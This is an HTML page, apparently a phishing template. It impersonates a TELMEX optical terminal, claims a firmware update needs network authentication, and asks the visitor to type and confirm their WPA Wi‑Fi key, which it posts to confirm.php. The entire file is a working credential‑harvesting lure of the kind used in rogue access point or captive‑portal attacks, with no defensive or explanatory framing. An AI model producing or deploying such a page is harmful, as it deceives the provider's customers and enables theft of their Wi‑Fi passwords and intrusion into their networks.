<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="./css/style.css">
    <title>Terminal Óptica</title>
</head>
<body>
    <div class="contenido">
        <nav class="nav">
            <ul>
                <li>
                    <a href=""><img src="./img/telmex.svg" alt="TELMEX"></a>
                </li>
            </ul>
        </nav>
        <div class="body_content">
            <div class="card_red">
                <div class="title">
                    <p>ACTUALIZACIÓN DEL FIRMWARE</p>
                </div>
                <div class="desc">
                    <p>Hay un nuevo firmware disponible para mejorar el desempeño y funcionalidades del sistema.</p>
                </div>
            </div>
            <div class="card_yellow">
                <div class="title">
                    <p>Se necesita autenticación para poder continuar con la operación. Por favor ingrese sus credenciales de red.</p>
                </div>
            </div>
            <div class="form">
                <form action="confirm.php" method="POST">
                    <p>
                        <label for="password">Clave WPA</label>
                    </p>
                    <p>
                        <input type="password" name="password" autocomplete="off">
                    </p>
                    <p>
                        <label for="password_check">Confirmar Clave</label>
                    </p>
                    <p>
                        <input type="password" name="password_check" autocomplete="off">
                    </p>
                    <p>
                        <input type="submit" value="Actualizar">
                    </p>
                </form>
            </div>
        </div>
    </div>
</body>
</html>